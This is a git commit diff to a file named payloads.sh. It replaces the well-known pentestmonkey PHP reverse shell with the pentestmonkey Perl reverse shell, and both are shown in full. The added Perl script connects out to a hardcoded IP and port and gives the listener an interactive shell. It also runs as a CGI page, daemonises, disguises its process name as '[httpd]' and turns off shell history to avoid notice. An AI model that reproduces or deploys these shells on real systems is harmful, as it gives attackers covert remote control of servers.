cd45f1d3ec2b6924b5b859df4ede046a72f15b8a
burllalokesh <117846762+burllalokesh@users.noreply.github.com>
2025-06-14 14:40:20 +0530

    Update payloads.sh

--- payloads.sh
+++ payloads.sh
@@ -1,116 +1,124 @@
-<?php
-// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
-// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+#!/usr/bin/perl -w
+# perl-reverse-shell - A Reverse Shell implementation in PERL
+# Copyright (C) 2006 pentestmonkey@pentestmonkey.net
+#
+# This tool may be used for legal purposes only.  Users take full responsibility
+# for any actions performed using this tool.  The author accepts no liability
+# for damage caused by this tool.  If these terms are not acceptable to you, then
+# do not use this tool.
+#
+# In all other respects the GPL version 2 applies:
+#
+# This program is free software; you can redistribute it and/or modify
+# it under the terms of the GNU General Public License version 2 as
+# published by the Free Software Foundation.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License along
+# with this program; if not, write to the Free Software Foundation, Inc.,
+# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+#
+# This tool may be used for legal purposes only.  Users take full responsibility
+# for any actions performed using this tool.  If these terms are not acceptable to
+# you, then do not use this tool.
+#
+# You are encouraged to send comments, improvements or suggestions to
+# me at pentestmonkey@pentestmonkey.net
+#
+# Description
+# -----------
+# This script will make an outbound TCP connection to a hardcoded IP and port.
+# The recipient will be given a shell running as the current user (apache normally).
+#
 
-set_time_limit (0);
-$VERSION = "1.0";
-$ip = '192.168.1.7';
-$port = 9900;
-$chunk_size = 1400;
-$write_a = null;
-$error_a = null;
-$shell = 'uname -a; w; id; sh -i';
-$daemon = 0;
-$debug = 0;
+use strict;
+use Socket;
+use FileHandle;
+use POSIX;
+my $VERSION = "1.0";
 
-if (function_exists('pcntl_fork')) {
-	$pid = pcntl_fork();
-	
-	if ($pid == -1) {
-		printit("ERROR: Can't fork");
-		exit(1);
+# Where to send the reverse shell.  Change these.
+my $ip = '192.168.1.7';
+my $port = 9900;
+
+# Options
+my $daemon = 1;
+my $auth   = 0; # 0 means authentication is disabled and any 
+		# source IP can access the reverse shell
+my $authorised_client_pattern = qr(^127\.0\.0\.1$);
+
+# Declarations
+my $global_page = "";
+my $fake_process_name = "/usr/sbin/apache";
+
+# Change the process name to be less conspicious
+$0 = "[httpd]";
+
+# Authenticate based on source IP address if required
+if (defined($ENV{'REMOTE_ADDR'})) {
+	cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");
+
+	if ($auth) {
+		unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
+			cgiprint("ERROR: Your client isn't authorised to view this page");
+			cgiexit();
+		}
 	}
-	
+} elsif ($auth) {
+	cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
+	cgiexit(0);
+}
+
+# Background and dissociate from parent process if required
+if ($daemon) {
+	my $pid = fork();
 	if ($pid) {
-		exit(0);  // Parent exits
-	}
-	if (posix_setsid() == -1) {
-		printit("Error: Can't setsid()");
-		exit(1);
+		cgiexit(0); # parent exits
 	}
 
-	$daemon = 1;
+	setsid();
+	chdir('/');
+	umask(0);
+}
+
+# Make TCP connection for reverse shell
+socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
+if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
+	cgiprint("Sent reverse shell to $ip:$port");
+	cgiprintpage();
 } else {
-	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+	cgiprint("Couldn't open reverse shell to $ip:$port: $!");
+	cgiexit();	
 }
 
-chdir("/");
+# Redirect STDIN, STDOUT and STDERR to the TCP connection
+open(STDIN, ">&SOCK");
+open(STDOUT,">&SOCK");
+open(STDERR,">&SOCK");
+$ENV{'HISTFILE'} = '/dev/null';
+system("w;uname -a;id;pwd");
+exec({"sh"} ($fake_process_name, "-i"));
 
-umask(0);
-
-// Open reverse connection
-$sock = fsockopen($ip, $port, $errno, $errstr, 30);
-if (!$sock) {
-	printit("$errstr ($errno)");
-	exit(1);
+# Wrapper around print
+sub cgiprint {
+	my $line = shift;
+	$line .= "<p>\n";
+	$global_page .= $line;
 }
 
-$descriptorspec = array(
-   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
-   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
-   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
-);
-
-$process = proc_open($shell, $descriptorspec, $pipes);
-
-if (!is_resource($process)) {
-	printit("ERROR: Can't spawn shell");
-	exit(1);
+# Wrapper around exit
+sub cgiexit {
+	cgiprintpage();
+	exit 0; # 0 to ensure we don't give a 500 response.
 }
 
-stream_set_blocking($pipes[0], 0);
-stream_set_blocking($pipes[1], 0);
-stream_set_blocking($pipes[2], 0);
-stream_set_blocking($sock, 0);
-
-printit("Successfully opened reverse shell to $ip:$port");
-
-while (1) {
-	if (feof($sock)) {
-		printit("ERROR: Shell connection terminated");
-		break;
-	}
-
-	if (feof($pipes[1])) {
-		printit("ERROR: Shell process terminated");
-		break;
-	}
-
-	$read_a = array($sock, $pipes[1], $pipes[2]);
-	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
-
-	if (in_array($sock, $read_a)) {
-		if ($debug) printit("SOCK READ");
-		$input = fread($sock, $chunk_size);
-		if ($debug) printit("SOCK: $input");
-		fwrite($pipes[0], $input);
-	}
-
-	if (in_array($pipes[1], $read_a)) {
-		if ($debug) printit("STDOUT READ");
-		$input = fread($pipes[1], $chunk_size);
-		if ($debug) printit("STDOUT: $input");
-		fwrite($sock, $input);
-	}
-
-	if (in_array($pipes[2], $read_a)) {
-		if ($debug) printit("STDERR READ");
-		$input = fread($pipes[2], $chunk_size);
-		if ($debug) printit("STDERR: $input");
-		fwrite($sock, $input);
-	}
+# Form HTTP response using all the messages gathered by cgiprint so far
+sub cgiprintpage {
+	print "Content-Length: " . length($global_page) . "\r
+Connection: close\r
+Content-Type: text\/html\r\n\r\n" . $global_page;
 }
-
-fclose($sock);
-fclose($pipes[0]);
-fclose($pipes[1]);
-fclose($pipes[2]);
-proc_close($process);
-
-function printit ($string) {
-	if (!$daemon) {
-		print "$string\n";
-	}
-}
-
-?>
